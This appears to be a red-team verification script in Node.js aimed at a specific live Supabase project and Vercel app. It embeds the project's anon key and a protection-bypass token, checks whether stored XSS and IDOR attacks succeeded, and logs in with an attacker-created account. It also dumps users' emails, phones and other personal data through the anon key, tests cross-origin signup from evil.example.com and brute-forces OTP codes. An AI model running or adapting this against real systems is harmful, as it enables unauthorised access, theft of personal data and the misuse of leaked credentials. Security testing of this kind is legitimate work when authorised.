#!/usr/bin/env node
/**
 * Verification probe — confirms what was stored in DB by the attack runs.
 */

const SUPA = 'https://pqvnjgyqbxlylawwogjv.supabase.co'
const ANON = 'sb_publishable_3uRUZqdvazd4cENt8WOWJA_SB7HmCEE'

async function req(url, init = {}) {
  const r = await fetch(url, init)
  const text = await r.text()
  let json = null
  try { json = JSON.parse(text) } catch {}
  return { status: r.status, text, json }
}

async function main() {
  // 1. Confirm the XSS payload was stored in profiles.full_name
  console.log('\n=== Check 1: XSS payload stored in DB ===')
  const xssRows = await req(`${SUPA}/rest/v1/profiles?or=(full_name.like.*script*,full_name.like.*alert*,full_name.like.*onerror*,full_name.like.*svg*)&select=id,email,full_name,role&limit=10`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('XSS-bearing profiles:', xssRows.status, xssRows.text.slice(0, 1500))

  // 2. Check the buddy role IDOR — was any 'redteam-ac-' user given a buddy row?
  console.log('\n=== Check 2: Was the create-profile IDOR attack successful? ===')
  const buddyPwned = await req(`${SUPA}/rest/v1/buddies?location_city=eq.PWNED&select=*`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('PWNED buddies:', buddyPwned.status, buddyPwned.text.slice(0, 1500))

  // 3. Check the attacker-confirmed victim — was email_confirmed_at set?
  console.log('\n=== Check 3: Did attacker force-confirm a victim? ===')
  // Try to log in with attacker-controlled credentials to see if email_confirmed_at was set
  const r = await req(`${SUPA}/auth/v1/token?grant_type=password`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', apikey: ANON },
    body: JSON.stringify({ email: 'redteam-ac-1790427720372@example.com', password: 'password123' }),
  })
  console.log('Login attempt with attacker-created account:', r.status, r.text.slice(0, 600))

  // 4. Profile leak — see how much PII the anon key exposes from profiles
  console.log('\n=== Check 4: profiles PII leak via anon ===')
  const profs = await req(`${SUPA}/rest/v1/profiles?select=id,email,full_name,phone,avatar_url,bio,role&limit=30`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('profiles count:', profs.json?.length, 'sample:', JSON.stringify(profs.json?.slice(0, 5), null, 2))

  // 5. Tourists PII leak
  console.log('\n=== Check 5: tourists PII leak ===')
  const tours = await req(`${SUPA}/rest/v1/tourists?select=*&limit=10`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('tourists sample:', JSON.stringify(tours.json?.slice(0, 3), null, 2))

  // 6. Buddies PII leak
  console.log('\n=== Check 6: buddies PII leak ===')
  const buds = await req(`${SUPA}/rest/v1/buddies?select=*&limit=10`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('buddies sample:', JSON.stringify(buds.json?.slice(0, 3), null, 2))

  // 7. Reviews PII leak
  console.log('\n=== Check 7: reviews leak ===')
  const revs = await req(`${SUPA}/rest/v1/reviews?select=*&limit=5`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('reviews:', JSON.stringify(revs.json?.slice(0, 3), null, 2))

  // 8. Try to enumerate how many profiles contain PII
  console.log('\n=== Check 8: full profiles count ===')
  const count = await req(`${SUPA}/rest/v1/profiles?select=id&limit=1000`, {
    headers: { apikey: ANON, authorization: 'Bearer ' + ANON },
  })
  console.log('total profiles visible to anon:', count.json?.length)

  // 9. Check Supabase RPC/auth functions leak
  console.log('\n=== Check 9: Check PostgREST OpenAPI leak ===')
  const openapi = await req(`${SUPA}/rest/v1/`, {
    headers: { apikey: ANON },
  })
  console.log('PostgREST root:', openapi.status, openapi.text.slice(0, 500))

  // 10. Test cross-origin signup from evil.example.com
  console.log('\n=== Check 10: Cross-origin signup ===')
  const cors = await req('https://localit-p05j9rsln-nhattoann.vercel.app/api/auth/signup', {
    method: 'POST',
    headers: {
      'content-type': 'application/json',
      origin: 'https://evil.example.com',
      'x-vercel-protection-bypass': 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A',
      referer: 'https://evil.example.com/attack',
    },
    body: JSON.stringify({ email: `cors-${Date.now()}@example.com`, password: 'password123', fullName: 'CORS', role: 'tourist' }),
  })
  console.log('cross-origin signup:', cors.status, cors.text.slice(0, 300))
  // Check CORS headers
  const corsPreflight = await req('https://localit-p05j9rsln-nhattoann.vercel.app/api/auth/signup', {
    method: 'OPTIONS',
    headers: {
      origin: 'https://evil.example.com',
      'access-control-request-method': 'POST',
      'access-control-request-headers': 'content-type',
      'x-vercel-protection-bypass': 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A',
    },
  })
  console.log('preflight OPTIONS:', corsPreflight.status, Object.fromEntries(Object.entries({
    'acao': corsPreflight.headers?.get?.('access-control-allow-origin'),
    'acam': corsPreflight.headers?.get?.('access-control-allow-methods'),
    'acah': corsPreflight.headers?.get?.('access-control-allow-headers'),
    'acc': corsPreflight.headers?.get?.('access-control-allow-credentials'),
  })))

  // 11. Verify the OTP resend email actually fires (look for any DB state change)
  console.log('\n=== Check 11: Verify OTP rate-limit per-userId ===')
  // Sign up two users — try to brute force verify-otp on user A while spamming resend-otp on user B
  const sa = await req('https://localit-p05j9rsln-nhattoann.vercel.app/api/auth/signup-admin', {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-vercel-protection-bypass': 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A' },
    body: JSON.stringify({ email: `redteam-burst-otp-${Date.now()}@example.com`, password: 'password123', fullName: 'Burst', role: 'tourist' }),
  })
  const uid = sa.json?.userId
  console.log('user for OTP burst:', sa.status, uid)
  if (uid) {
    let lockoutTriggered = false
    for (let i = 0; i < 12; i++) {
      const r = await req('https://localit-p05j9rsln-nhattoann.vercel.app/api/auth/verify-otp', {
        method: 'POST',
        headers: { 'content-type': 'application/json', 'x-vercel-protection-bypass': 'w6XAcwiXyFf9Pea8I6zwVONXAhc8Xs9A' },
        body: JSON.stringify({ userId: uid, code: String(Math.floor(Math.random() * 1e6)).padStart(6, '0') }),
      })
      if (r.status === 410) {
        lockoutTriggered = true
        console.log(`lockout hit at attempt ${i + 1}, response:`, r.status, r.text.slice(0, 100))
        break
      }
    }
    if (!lockoutTriggered) console.log('did not trigger lockout in 12 attempts')
  }
}

main().catch(e => { console.error('FATAL', e); process.exit(1) })